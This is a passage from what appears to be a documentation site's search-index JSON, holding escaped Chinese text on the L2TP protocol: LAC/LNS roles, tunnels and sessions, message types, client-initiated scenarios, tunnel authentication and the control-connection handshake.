\u548c LNS \u5efa\u7acb\u4e86 L2TP \u96a7\u9053\uff1b\u5bf9 PPP\uff0cLNS \u662f PPP \u4f1a\u8bdd\u7684\u903b\u8f91\u7ec8\u6b62\u7aef\u70b9\uff0c\u5373 PPP \u7ec8\u7aef\u548c LNS \u5efa\u7acb\u4e86\u4e00\u6761\u70b9\u5230\u70b9\u7684\u865a\u62df\u94fe\u8def\u3002LNS \u4f4d\u4e8e\u4f01\u4e1a\u603b\u90e8\u79c1\u7f51\u4e0e\u516c\u7f51\u8fb9\u754c\uff0c\u901a\u5e38\u662f\u4f01\u4e1a\u603b\u90e8\u7684\u7f51\u5173\u8bbe\u5907\u3002\u5fc5\u8981\u65f6\uff0cLNS \u8fd8\u517c\u6709\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff08NAT\uff09\u529f\u80fd\uff0c\u5bf9\u4f01\u4e1a\u603b\u90e8\u7f51\u7edc\u5185\u7684\u79c1\u6709 IP \u5730\u5740\u4e0e\u516c\u5171 IP \u5730\u5740\u8fdb\u884c\u8f6c\u6362\u3002</li> </ul> <p>\u5728 LAC \u548c LNS \u7684 L2TP \u4ea4\u4e92\u8fc7\u7a0b\u4e2d\u5b58\u5728\u4e24\u79cd\u7c7b\u578b\u7684\u8fde\u63a5\u3002</p> <ul> <li>\u96a7\u9053\uff08Tunnel\uff09\u8fde\u63a5\uff1aL2TP \u96a7\u9053\u5728 LAC \u548c LNS \u4e4b\u95f4\u5efa\u7acb\uff0c\u4e00\u5bf9 LAC \u548c LNS \u53ef\u4ee5\u5efa\u7acb\u591a\u4e2a L2TP \u96a7\u9053\uff0c\u4e00\u4e2a L2TP \u96a7\u9053\u53ef\u4ee5\u5305\u542b\u591a\u4e2a L2TP \u4f1a\u8bdd\u3002</li> <li>\u4f1a\u8bdd\uff08Session\uff09\u8fde\u63a5\uff1aL2TP \u4f1a\u8bdd\u53d1\u751f\u5728\u96a7\u9053\u8fde\u63a5\u6210\u529f\u4e4b\u540e\uff0cL2TP \u4f1a\u8bdd\u627f\u8f7d\u5728 L2TP \u96a7\u9053\u4e4b\u4e0a\uff0c\u6bcf\u4e2a L2TP \u4f1a\u8bdd\u5bf9\u5e94\u4e00\u4e2a PPP \u4f1a\u8bdd\uff0cPPP \u4f1a\u8bdd\u7684\u6570\u636e\u5e27\u901a\u8fc7 L2TP \u4f1a\u8bdd\u6240\u5728\u7684 L2TP \u96a7\u9053\u4f20\u8f93\u3002</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-\u62a5\u6587","title":"L2TP \u62a5\u6587","text":"<p>\u5728 L2TP \u96a7\u9053\u4e2d\u4ea4\u6362\u7684\u7684\u6570\u636e\u5305\u53ef\u5206\u7c7b\u4e3a\u63a7\u5236\u6570\u636e\u5305\u6216\u662f\u6570\u636e\u5305\u3002L2TP \u63d0\u4f9b\u63a7\u5236\u6570\u636e\u5305\u7684\u53ef\u9760\u6027\uff0c\u6570\u636e\u5305\u5219\u6ca1\u6709\u3002</p>      L2TP \u534f\u8bae\u67b6\u6784      Huawei <ul> <li>\u63a7\u5236\u6d88\u606f\uff1a\u7528\u4e8e L2TP \u96a7\u9053\u548c\u4f1a\u8bdd\u8fde\u63a5\u7684\u5efa\u7acb\u3001\u7ef4\u62a4\u548c\u62c6\u9664\u3002\u5728\u63a7\u5236\u6d88\u606f\u7684\u4f20\u8f93\u8fc7\u7a0b\u4e2d\uff0c\u4f7f\u7528\u6d88\u606f\u4e22\u5931\u91cd\u4f20\u548c\u5b9a\u65f6\u68c0\u6d4b\u96a7\u9053\u8fde\u901a\u6027\u7b49\u673a\u5236\u6765\u4fdd\u8bc1\u63a7\u5236\u6d88\u606f\u4f20\u8f93\u7684\u53ef\u9760\u6027\uff0c\u652f\u6301\u5bf9\u63a7\u5236\u6d88\u606f\u7684\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002<ul> <li>AVP\uff1a\u63a7\u5236\u6d88\u606f\u4e2d\u7684\u53c2\u6570\u7edf\u4e00\u4f7f\u7528\u5c5e\u6027\u503c\u5bf9\uff08Attribute Value Pair\uff0cAVP\uff09\u6765\u8868\u793a\uff0c\u4f7f\u5f97\u534f\u8bae\u5177\u6709\u5f88\u597d\u7684\u4e92\u64cd\u4f5c\u6027\u548c\u53ef\u6269\u5c55\u6027\u3002\u63a7\u5236\u6d88\u606f\u5305\u542b\u591a\u4e2a AVP\u3002</li> </ul> </li> <li>\u6570\u636e\u6d88\u606f\uff1a\u7528\u4e8e\u5c01\u88c5 PPP \u6570\u636e\u5e27\u5e76\u5728\u96a7\u9053\u4e0a\u4f20\u8f93\u3002\u6570\u636e\u6d88\u606f\u662f\u4e0d\u53ef\u9760\u7684\u4f20\u8f93\uff0c\u4e0d\u91cd\u4f20\u4e22\u5931\u7684\u6570\u636e\u62a5\u6587\uff0c\u4e0d\u652f\u6301\u5bf9\u6570\u636e\u6d88\u606f\u7684\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002</li> </ul>      L2TP \u62a5\u6587\u683c\u5f0f      Huawei <p>\u62a5\u6587\u957f\u5ea6</p> <p>L2TP \u62a5\u6587\u8fdb\u884c\u4e86\u591a\u6b21\u5c01\u88c5\uff0c\u6bd4\u539f\u59cb\u62a5\u6587\u591a\u51fa 38 \u4e2a\u5b57\u8282\uff08\u5982\u679c\u9700\u8981\u643a\u5e26\u5e8f\u5217\u53f7\u4fe1\u606f\uff0c\u5219\u6bd4\u539f\u59cb\u62a5\u6587\u591a\u51fa 42 \u4e2a\u5b57\u8282\uff09\uff0c\u5c01\u88c5\u540e\u62a5\u6587\u7684\u957f\u5ea6\u53ef\u80fd\u4f1a\u8d85\u51fa\u63a5\u53e3\u7684 MTU \u503c\uff0c\u800c L2TP \u534f\u8bae\u672c\u8eab\u4e0d\u652f\u6301\u62a5\u6587\u5206\u7247\u529f\u80fd\uff0c\u8fd9\u65f6\u9700\u8981\u8bbe\u5907\u652f\u6301\u5bf9 IP \u62a5\u6587\u7684\u5206\u7247\u529f\u80fd\u3002\u5f53 L2TP \u62a5\u6587\u957f\u5ea6\u8d85\u51fa\u53d1\u9001\u63a5\u53e3\u7684 MTU \u503c\u65f6\uff0c\u5728\u53d1\u9001\u63a5\u53e3\u8fdb\u884c\u62a5\u6587\u5206\u7247\u5904\u7406\uff0c\u63a5\u6536\u7aef\u5bf9\u6536\u5230\u5206\u7247\u62a5\u6587\u8fdb\u884c\u8fd8\u539f\uff0c\u91cd\u7ec4\u4e3a L2TP \u62a5\u6587\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#client-initiated-\u573a\u666f","title":"Client-Initiated \u573a\u666f","text":"<p>Info</p> <p>\u79fb\u52a8\u529e\u516c\u7528\u6237\uff08\u5373\u51fa\u5dee\u5458\u5de5\uff09\u901a\u8fc7\u4ee5\u592a\u7f51\u65b9\u5f0f\u63a5\u5165 Internet\uff0cLNS \u662f\u4f01\u4e1a\u603b\u90e8\u7684\u51fa\u53e3\u7f51\u5173\u3002\u79fb\u52a8\u529e\u516c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u79fb\u52a8\u7ec8\u7aef\u4e0a\u7684 VPN \u8f6f\u4ef6\u4e0e LNS \u8bbe\u5907\u76f4\u63a5\u5efa\u7acb L2TP \u96a7\u9053\uff0c\u800c\u65e0\u9700\u518d\u7ecf\u8fc7\u4e00\u4e2a\u5355\u72ec\u7684 NAS \u8bbe\u5907\u3002\u8be5\u573a\u666f\u4e0b\uff0c\u7528\u6237\u8fdc\u7a0b\u8bbf\u95ee\u4f01\u4e1a\u5185\u7f51\u8d44\u6e90\u53ef\u4ee5\u4e0d\u53d7\u5730\u57df\u9650\u5236\uff0c\u4f7f\u5f97\u8fdc\u7a0b\u529e\u516c\u66f4\u4e3a\u7075\u6d3b\u65b9\u4fbf\u3002</p> <p>Client-Initiated \u573a\u666f\uff0c\u79fb\u52a8\u529e\u516c\u7528\u6237\u5728\u8bbf\u95ee\u4f01\u4e1a\u603b\u90e8\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u9700\u8981\u5148\u901a\u8fc7 L2TP VPN \u8f6f\u4ef6\u4e0e LNS \u5efa\u7acb L2TP \u96a7\u9053\u3002</p>      Client-Initiated \u573a\u666f\u4e0b L2TP \u96a7\u9053\u5efa\u7acb\u8fc7\u7a0b      Huawei <ol> <li>\u79fb\u52a8\u529e\u516c\u7528\u6237\u4e0e LNS \u5efa\u7acb L2TP \u96a7\u9053\u3002</li> <li>\u79fb\u52a8\u529e\u516c\u7528\u6237\u4e0e LNS \u5efa\u7acb L2TP \u4f1a\u8bdd\uff1a\u79fb\u52a8\u529e\u516c\u7528\u6237\u5728\u7b2c 3 \u6b65\u4f1a\u4e0e LNS \u95f4\u5efa\u7acb PPP \u8fde\u63a5\uff0cL2TP \u4f1a\u8bdd\u7528\u6765\u8bb0\u5f55\u548c\u7ba1\u7406\u5b83\u4eec\u4e4b\u95f4\u7684 PPP \u8fde\u63a5\u72b6\u6001\u3002\u56e0\u6b64\uff0c\u5728\u5efa\u7acb PPP \u8fde\u63a5\u4ee5\u524d\uff0c\u96a7\u9053\u53cc\u65b9\u9700\u8981\u4e3a PPP \u8fde\u63a5\u9884\u5148\u534f\u5546\u51fa\u4e00\u4e2a L2TP \u4f1a\u8bdd\u3002\u4f1a\u8bdd\u4e2d\u643a\u5e26\u4e86\u79fb\u52a8\u529e\u516c\u7528\u6237\u7684 LCP \u534f\u5546\u4fe1\u606f\u548c\u7528\u6237\u8ba4\u8bc1\u4fe1\u606f\uff0cLNS \u5bf9\u6536\u5230\u7684\u4fe1\u606f\u8ba4\u8bc1\u901a\u8fc7\u540e\uff0c\u901a\u77e5\u79fb\u52a8\u529e\u516c\u7528\u6237\u4f1a\u8bdd\u5efa\u7acb\u6210\u529f\u3002L2TP \u4f1a\u8bdd\u8fde\u63a5\u7531\u4f1a\u8bdd ID \u8fdb\u884c\u6807\u8bc6\u3002</li> <li>\u79fb\u52a8\u529e\u516c\u7528\u6237\u4e0e LNS \u5efa\u7acb PPP \u8fde\u63a5\uff1a\u79fb\u52a8\u529e\u516c\u7528\u6237\u901a\u8fc7\u4e0e LNS \u5efa\u7acb PPP \u8fde\u63a5\u83b7\u53d6 LNS \u5206\u914d\u7684\u4f01\u4e1a\u5185\u7f51 IP \u5730\u5740\u3002</li> <li>\u79fb\u52a8\u529e\u516c\u7528\u6237\u53d1\u9001\u4e1a\u52a1\u62a5\u6587\u8bbf\u95ee\u4f01\u4e1a\u603b\u90e8\u670d\u52a1\u5668\u3002</li> </ol> <p>\u62a5\u6587\u7684\u5c01\u88c5\u548c\u89e3\u5c01\u88c5\u8fc7\u7a0b\uff1a</p>      Client-Initiated \u573a\u666f\u4e0b\u62a5\u6587\u7684\u5c01\u88c5\u8fc7\u7a0b      Huawei <ol> <li>\u79fb\u52a8\u529e\u516c\u7528\u6237\u5411\u4f01\u4e1a\u603b\u90e8\u670d\u52a1\u5668\u53d1\u9001\u4e1a\u52a1\u62a5\u6587\uff1a\u4e1a\u52a1\u62a5\u6587\u901a\u8fc7 L2TP \u62e8\u53f7\u8f6f\u4ef6\u8fdb\u884c PPP \u5c01\u88c5\u548c L2TP \u5c01\u88c5\uff0c\u7136\u540e\u6309\u7167\u79fb\u52a8\u529e\u516c\u7528\u6237 PC \u7684\u672c\u5730\u8def\u7531\u8f6c\u53d1\u7ed9 LNS\u3002</li> <li>LNS \u63a5\u6536\u5230\u62a5\u6587\u4ee5\u540e\uff0c\u62c6\u9664\u62a5\u6587\u7684 L2TP \u5934\u548c PPP \u5934\uff0c\u7136\u540e\u6309\u7167\u5230\u4f01\u4e1a\u5185\u7f51\u7684\u8def\u7531\u5c06\u62a5\u6587\u8f6c\u53d1\u7ed9\u4f01\u4e1a\u603b\u90e8\u670d\u52a1\u5668\u3002</li> <li>\u4f01\u4e1a\u603b\u90e8\u670d\u52a1\u5668\u6536\u5230\u79fb\u52a8\u529e\u516c\u7528\u6237\u7684\u62a5\u6587\u540e\uff0c\u5411\u79fb\u52a8\u529e\u516c\u7528\u6237\u8fd4\u56de\u54cd\u5e94\u62a5\u6587\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-client-initiated-\u573a\u666f","title":"L2TP Client-Initiated \u573a\u666f","text":"<p>Info</p> <p>L2TP \u9664\u4e86\u53ef\u4ee5\u4e3a\u51fa\u5dee\u5458\u5de5\u63d0\u4f9b\u8fdc\u7a0b\u63a5\u5165\u670d\u52a1\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u8fdb\u884c\u4f01\u4e1a\u5206\u652f\u4e0e\u603b\u90e8\u7684\u5185\u7f51\u4e92\u8054\uff0c\u5b9e\u73b0\u5206\u652f\u7528\u6237\u4e0e\u603b\u90e8\u7528\u6237\u7684\u4e92\u8bbf\u3002</p> <p>\u4f01\u4e1a\u5206\u652f\u7528\u6237\u8bbf\u95ee\u4f01\u4e1a\u603b\u90e8\u65f6\uff0c\u4f1a\u90e8\u7f72 L2TP Client \u81ea\u52a8\u5411 LNS \u53d1\u8d77\u62e8\u53f7\uff0c\u5efa\u7acb L2TP \u96a7\u9053\u548c\u4f1a\u8bdd\uff0c\u6b64\u65f6\u4e0d\u9700\u8981\u5206\u652f\u673a\u6784\u7528\u6237\u62e8\u53f7\u6765\u89e6\u53d1\u3002\u5bf9\u4e8e\u5206\u652f\u673a\u6784\u7528\u6237\u6765\u8bf4\uff0c\u8bbf\u95ee\u603b\u90e8\u7f51\u7edc\u5c31\u8ddf\u8bbf\u95ee\u81ea\u5df1\u6240\u5728\u7684\u5206\u652f\u673a\u6784\u7f51\u7edc\u4e00\u6837\uff0c\u5b8c\u5168\u611f\u89c9\u4e0d\u5230\u81ea\u5df1\u662f\u5728\u8fdc\u7a0b\u63a5\u5165\u3002L2TP Client \u662f\u4f01\u4e1a\u5206\u652f\u7684\u51fa\u53e3\u7f51\u5173\uff0cLNS \u662f\u4f01\u4e1a\u603b\u90e8\u7684\u51fa\u53e3\u7f51\u5173\u3002L2TP Client \u548c LNS \u90e8\u7f72\u4e86 L2TP \u4ee5\u540e\uff0cL2TP Client \u8bbe\u5907\u4f1a\u4e3b\u52a8\u5411 LNS \u53d1\u8d77 L2TP \u96a7\u9053\u5efa\u7acb\u8bf7\u6c42\uff0c\u96a7\u9053\u5efa\u7acb\u5b8c\u6210\u540e\uff0c\u5206\u652f\u7528\u6237\u8bbf\u95ee\u603b\u90e8\u7684\u6d41\u91cf\u76f4\u63a5\u901a\u8fc7 L2TP \u96a7\u9053\u4f20\u8f93\u5230\u5bf9\u7aef\u3002\u8be5\u573a\u666f\u4e0b\uff0cL2TP \u96a7\u9053\u5efa\u7acb\u5728 L2TP Client \u4e0e LNS \u4e4b\u95f4\uff0c\u96a7\u9053\u5bf9\u4e8e\u7528\u6237\u662f\u900f\u660e\u7684\uff0c\u7528\u6237\u611f\u77e5\u4e0d\u5230\u96a7\u9053\u7684\u5b58\u5728\u3002</p> <p>\u5f53\u6211\u4eec\u5728\u8def\u7531\u5668\u4e0a\u914d\u7f6e L2TP \u4e0a\u7f51\u65f6\uff0c\u5373\u4e3a L2TP Client-Initiated \u573a\u666f\u3002</p> <p>L2TP Client-Initiated \u573a\u666f\uff0cL2TP Client \u548c LNS \u914d\u7f6e\u5b8c L2TP \u4ee5\u540e\uff0cL2TP Client \u4f1a\u4e3b\u52a8\u5411 LNS \u53d1\u8d77\u96a7\u9053\u534f\u5546\u8bf7\u6c42\u3002</p>      L2TP Client-Initiated \u573a\u666f\u4e0b L2TP \u96a7\u9053\u5efa\u7acb\u8fc7\u7a0b      Huawei <ol> <li>L2TP Client \u4e0e LNS \u5efa\u7acb L2TP \u96a7\u9053\u3002</li> <li>L2TP Client \u4e0e LNS \u5efa\u7acb L2TP \u4f1a\u8bdd\uff1aL2TP Client \u5728\u7b2c 3 \u6b65\u4f1a\u4e0e LNS \u95f4\u5efa\u7acb PPP \u8fde\u63a5\uff0cL2TP \u4f1a\u8bdd\u7528\u6765\u8bb0\u5f55\u548c\u7ba1\u7406\u5b83\u4eec\u4e4b\u95f4\u7684 PPP \u8fde\u63a5\u72b6\u6001\u3002\u56e0\u6b64\uff0c\u5728\u5efa\u7acb PPP \u8fde\u63a5\u4ee5\u524d\uff0c\u96a7\u9053\u53cc\u65b9\u9700\u8981\u4e3a PPP \u8fde\u63a5\u9884\u5148\u534f\u5546\u51fa\u4e00\u4e2a L2TP \u4f1a\u8bdd\u3002</li> <li>L2TP Client \u4e0e LNS \u5efa\u7acb PPP \u8fde\u63a5\uff1aL2TP Client \u901a\u8fc7\u4e0e LNS \u5efa\u7acb PPP \u8fde\u63a5\u83b7\u53d6 LNS \u5206\u914d\u7684\u4f01\u4e1a\u5185\u7f51 IP \u5730\u5740\u3002</li> <li>\u4f01\u4e1a\u5206\u652f\u5458\u5de5\u53d1\u9001\u8bbf\u95ee\u4f01\u4e1a\u603b\u90e8\u670d\u52a1\u5668\u7684\u4e1a\u52a1\u62a5\u6587\uff0c\u62a5\u6587\u7ecf\u8fc7 L2TP Client \u548c LNS \u7684\u52a0\u89e3\u5c01\u88c5\u540e\u5230\u8fbe\u5bf9\u7aef\u3002</li> </ol> <p>\u62a5\u6587\u7684\u5c01\u88c5\u548c\u89e3\u5c01\u88c5\u8fc7\u7a0b\uff1a</p>      L2TP Client-Initiated \u573a\u666f\u4e0b\u62a5\u6587\u7684\u5c01\u88c5\u8fc7\u7a0b      Huawei <ol> <li>\u4f01\u4e1a\u5206\u652f\u5458\u5de5\u5411\u603b\u90e8\u5185\u7f51\u670d\u52a1\u5668\u53d1\u9001\u8bbf\u95ee\u8bf7\u6c42\uff1a\u5206\u652f\u5458\u5de5\u7684 PC \u6309\u7167\u672c\u5730\u8def\u7531\u5c06\u8bf7\u6c42\u62a5\u6587\u8f6c\u53d1\u7ed9 L2TP Client\u3002</li> <li>L2TP Client \u6536\u5230\u62a5\u6587\u540e\u4f7f\u7528 VT\uff08Virtual-Template\uff09\u63a5\u53e3\u5bf9\u6b64\u62a5\u6587\u8fdb\u884c PPP \u5c01\u88c5\u548c L2TP \u5c01\u88c5\uff1a\u62a5\u6587\u5c01\u88c5\u5b8c\u6210\u540e L2TP Client \u518d\u6309\u7167\u5230 Internet \u7684\u516c\u7f51\u8def\u7531\u5c06\u5c01\u88c5\u597d\u7684\u62a5\u6587\u53d1\u9001\u51fa\u53bb\u3002</li> <li>LNS \u8bbe\u5907\u63a5\u6536\u5230\u62a5\u6587\u4ee5\u540e\uff0c\u4f7f\u7528 VT \u63a5\u53e3\u62c6\u9664\u62a5\u6587\u7684 L2TP \u5934\u548c PPP \u5934\uff0c\u7136\u540e\u6309\u7167\u5230\u4f01\u4e1a\u5185\u7f51\u7684\u8def\u7531\u5c06\u62a5\u6587\u8f6c\u53d1\u7ed9\u603b\u90e8\u5185\u7f51\u670d\u52a1\u5668\u3002</li> <li>\u4f01\u4e1a\u603b\u90e8\u670d\u52a1\u5668\u6536\u5230\u5206\u652f\u5458\u5de5\u7684\u62a5\u6587\u540e\uff0c\u5411\u5206\u652f\u5458\u5de5\u8fd4\u56de\u54cd\u5e94\u62a5\u6587\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-\u5b89\u5168\u6027","title":"L2TP \u5b89\u5168\u6027","text":"<p>Quote</p> <ul> <li>\u914d\u7f6e L2TP \u96a7\u9053\u9a8c\u8bc1\u65b9\u5f0f - \u534e\u4e3a</li> </ul> <p>L2TP \u96a7\u9053\u63d0\u4f9b\u7b80\u5355\u7684\u96a7\u9053\u9a8c\u8bc1\u529f\u80fd\uff1aLAC \u4e0e LNS \u7684\u96a7\u9053\u9a8c\u8bc1\u901a\u8fc7\u4e4b\u540e\uff0c\u96a7\u9053\u624d\u80fd\u5efa\u7acb\u6210\u529f\u3002L2TP \u96a7\u9053\u652f\u6301\u672c\u5730\u8ba4\u8bc1\u3001\u8fdc\u7aef\uff08RADIUS\uff09\u8ba4\u8bc1\u548c RADIUS \u5f3a\u5236\u96a7\u9053\u9a8c\u8bc1\u3002</p> <p>L2TP \u534f\u8bae\u81ea\u8eab\u4e0d\u63d0\u4f9b\u52a0\u5bc6\u4e0e\u53ef\u9760\u6027\u9a8c\u8bc1\u7684\u529f\u80fd\uff0c\u53ef\u4ee5\u548c\u5b89\u5168\u534f\u8bae\u642d\u914d\u4f7f\u7528\uff0c\u4ece\u800c\u5b9e\u73b0\u6570\u636e\u7684\u52a0\u5bc6\u4f20\u8f93\u3002\u7ecf\u5e38\u4e0e L2TP \u534f\u8bae\u642d\u914d\u7684\u52a0\u5bc6\u534f\u8bae\u662f IPsec\uff0c\u5f53\u8fd9\u4e24\u4e2a\u534f\u8bae\u642d\u914d\u4f7f\u7528\u65f6\uff0c\u901a\u5e38\u5408\u79f0 L2TP/IPsec\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-\u96a7\u9053\u5efa\u7acb\u8fc7\u7a0b","title":"L2TP \u96a7\u9053\u5efa\u7acb\u8fc7\u7a0b","text":"<p>L2TP \u96a7\u9053\u5efa\u7acb\u8fc7\u7a0b\u4e2d\u6d89\u53ca\u7684\u6d88\u606f\u5305\u62ec\uff1a</p> <ul> <li>SCCRQ\uff08Start-Control-Connection-Request\uff09\uff1a\u7528\u6765\u5411\u5bf9\u7aef\u8bf7\u6c42\u5efa\u7acb\u63a7\u5236\u8fde\u63a5\u3002</li> <li>SCCRP\uff08Start-Control-Connection-Reply\uff09\uff1a\u7528\u6765\u544a\u8bc9\u5bf9\u7aef\uff0c\u672c\u7aef\u6536\u5230\u4e86\u5bf9\u7aef\u7684 SCCRQ \u6d88\u606f\uff0c\u5141\u8bb8\u5efa\u7acb\u63a7\u5236\u8fde\u63a5\u3002</li> <li>StopCCN\uff08Stop-Control-Connection-Notification\uff09\uff1a\u7528\u6765\u901a\u77e5\u5bf9\u7aef\u62c6\u9664\u63a7\u5236\u8fde\u63a5\u3002</li> <li>SCCCN\uff08Start-Control-Connection-Connected\uff09\uff1a\u7528\u6765\u544a\u8bc9\u5bf9\u7aef\uff0c\u672c\u7aef\u6536\u5230\u4e86\u5bf9\u7aef\u7684 SCCRP \u6d88\u606f\uff0c\u672c\u7aef\u5df2\u5b8c\u6210\u96a7\u9053\u7684\u5efa\u7acb\u3002</li> <li>Hello\uff1a\u7528\u6765\u68c0\u6d4b\u96a7\u9053\u7684\u8fde\u901a\u6027\u3002</li> <li>ZLB\uff08Zero-Length Body\uff09\uff1a\u5982\u679c\u672c\u7aef\u7684\u961f\u5217\u6ca1\u6709\u8981\u53d1\u9001\u7684\u6d88\u606f\u65f6\uff0c\u53d1\u9001 ZLB \u7ed9\u5bf9\u7aef\u3002\u5728\u63a7\u5236\u8fde\u63a5\u7684\u62c6\u9664\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u9001\u65b9\u9700\u8981\u53d1\u9001 STOPCCN\uff0c\u63a5\u6536\u65b9\u53d1\u9001 ZLB\u3002ZLB \u53ea\u6709 L2TP \u5934\uff0c\u6ca1\u6709\u8d1f\u8f7d\u90e8\u5206\uff0c\u56e0\u6b64\u800c\u5f97\u540d\u3002</li> </ul> <p>\u63a7\u5236\u8fde\u63a5\u7684\u5efa\u7acb\u5148\u4e8e\u4f1a\u8bdd\u8fde\u63a5\u3002\u53ea\u6709\u63a7\u5236\u8fde\u63a5\u5efa\u7acb\u8d77\u6765\u4e86\uff0c\u4f1a\u8bdd\u8fde\u63a5\u624d\u53ef\u80fd\u5efa\u7acb\u8d77\u6765\u3002</p>      \u63a7\u5236\u8fde\u63a5\u5efa\u7acb\u7684\u4e09\u6b21\u63e1\u624b      Huawei <ul> <li>LAC \u548c LNS \u4e4b\u95f4\u8def\u7531\u76f8\u4e92\u53ef\u8fbe\u540e\uff0cLAC \u7aef\u8bbe\u7f6e\u76f8\u5e94 AVP\uff0c\u5411 LNS \u7aef\u53d1\u51fa SCCRQ \u62a5\u6587\uff0c\u8bf7\u6c42\u5efa\u7acb\u63a7\u5236\u8fde\u63a5\u3002</li> <li>LNS \u6536\u5230\u6765\u81ea LAC \u7684 SCCRQ\u3002\u6839\u636e\u5176\u4e2d\u7684 AVP\uff0c\u5982\u679c\u540c\u610f\u5efa\u7acb\u96a7\u9053\uff0c\u4fbf\u53d1\u9001 SCCRP \u62a5\u6587\u7ed9 LAC\u3002</li> <li>LAC \u5bf9\u63a5\u6536\u5230\u7684 SCCRP \u62a5\u6587\u8fdb\u884c\u68c0\u67e5\uff0c\u4ece\u4e2d\u53d6\u51fa\u96a7\u9053\u4fe1\u606f\uff0c\u5e76\u5411 LNS \u53d1\u9001 SCCCN \u62a5\u6587\uff0c\u8868\u793a\u63a7\u5236\u8fde\u63a5\u5efa\u7acb\u6210\u529f\u3002</li> <li>\u5f53\u6d88\u606f\u961f\u5217\u4e2d\u6ca1\u6709\u6d88\u606f\u65f6\uff0cLNS \u53d1\u9001 ZLB \u7ed9\u5bf9\u7aef\u3002</li> </ul> <p>\u96a7\u9053\u9a8c\u8bc1\u662f\u548c\u5efa\u7acb\u96a7\u9053\u540c\u65f6\u8fdb\u884c\u7684\uff0c\u4e0d\u662f\u5355\u72ec\u8fdb\u884c\u7684\u3002\u96a7\u9053\u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u9996\u5148 LAC \u5411 LNS \u53d1 SCCRQ \u8bf7\u6c42\u6d88\u606f\u65f6\uff0c\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u672c\u7aef\u7684 CHAP Challenge\uff08SCCRQ \u643a\u5e26\u7684\u5b57\u6bb5\uff09\u53d1\u7ed9 LNS\u3002</li> <li>LNS \u6536\u5230 SCCRQ \u540e\uff0c\u5229\u7528 LAC \u4fa7\u53d1\u9001\u7684 CHAP Challenge \u548c\u672c\u7aef\u914d\u7f6e\u7684\u5bc6\u7801\u4ea7\u751f\u4e00\u4e2a 16 \u4e2a\u5b57\u8282\u7684 Response\uff1b\u540c\u65f6\u4e5f\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u5b57\u7b26\u4e32\uff08LNS CHAP Challenge\uff09\uff0c\u5c06\u968f\u673a\u751f\u6210\u7684\u8fd9\u4e2a\u5b57\u7b26\u4e32\u548c Response \u653e\u5728 SCCRP \u4e2d\u4e00\u8d77\u53d1\u7ed9 LAC\u3002</li> <li>LAC \u7aef\u6536\u5230 SCCRP \u540e\uff0c\u5bf9 LNS \u8fdb\u884c\u9a8c\u8bc1\u3002<ul> <li>LAC \u7aef\u5229\u7528\u81ea\u5df1\u7684 CHAP Challenge \u548c\u672c\u7aef\u914d\u7f6e\u7684\u5bc6\u7801\uff0c\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684 16 \u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff1b</li> <li>LAC \u7aef\u5c06\u65b0\u4ea7\u751f\u7684\u5b57\u7b26\u4e32\u4e0e LNS \u7aef\u53d1\u6765\u7684 SCCRP \u4e2d\u5e26\u7684 LNS CHAP Response \u505a\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u5219\u96a7\u9053\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5426\u5219\u96a7\u9053\u9a8c\u8bc1\u4e0d\u901a\u8fc7\uff0c\u65ad\u6389\u96a7\u9053\u8fde\u63a5\u3002</li> </ul> </li> <li>\u5982\u679c\u9a8c\u8bc1\u901a\u8fc7\uff0cLAC \u5c06\u81ea\u5df1\u7684 CHAP Response \u653e\u5728 SCCCN \u6d88\u606f\u4e2d\u53d1\u7ed9 LNS\u3002</li> <li>LNS \u6536\u5230 SCCCN \u6d88\u606f\u540e\uff0c\u4e5f\u8fdb\u884c\u9a8c\u8bc1\uff1a<ul> <li>LNS \u7aef\u5229\u7528\u672c\u7aef\u7684 CHAP Challenge\u3001\u672c\u7aef\u914d\u7f6e\u7684\u5bc6\u7801\uff0c\u4ea7\u751f\u4e00\u4e2a 16 \u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff1b</li> <li>LNS \u7aef\u4e0e SCCCN \u6d88\u606f\u4e2d\u5f97\u5230\u7684 LAC CHAP Response \u505a\u6bd4\u8f83\u3002\u5982\u679c\u76f8\u540c\uff0c\u5219\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5426\u5219\u62c6\u9664\u96a7\u9053\u3002</li> </ul> </li> </ol> <p>L2TP \u4f7f\u7528 Hello \u62a5\u6587\u68c0\u6d4b\u96a7\u9053\u7684\u8fde\u901a\u6027\u3002LAC \u548c LNS \u5b9a\u65f6\u5411\u5bf9\u7aef\u53d1\u9001 Hello \u62a5\u6587\uff0c\u82e5\u5728\u4e00\u6bb5\u65f6\u95f4\u5185\u672a\u6536\u5230 Hello \u62a5\u6587\u7684\u5e94\u7b54\uff0c\u5219\u91cd\u590d\u53d1\u9001 Hello \u62a5\u6587\u3002\u5982\u679c\u91cd\u590d\u53d1\u9001\u62a5\u6587\u7684\u6b21\u6570\u8d85\u8fc7 5 \u6b21\uff0c\u5219\u8ba4\u4e3a L2TP \u96a7\u9053\u5df2\u7ecf\u65ad\u5f00\uff0c\u8be5 PPP \u4f1a\u8bdd\u5c06\u88ab\u6e05\u9664\u3002\u6b64\u65f6\u9700\u8981\u91cd\u65b0\u5efa\u7acb\u96a7\u9053\u3002</p> <p>\u63a7\u5236\u8fde\u63a5\u62c6\u9664\u7684\u53d1\u8d77\u7aef\u53ef\u4ee5\u662f LAC \u6216 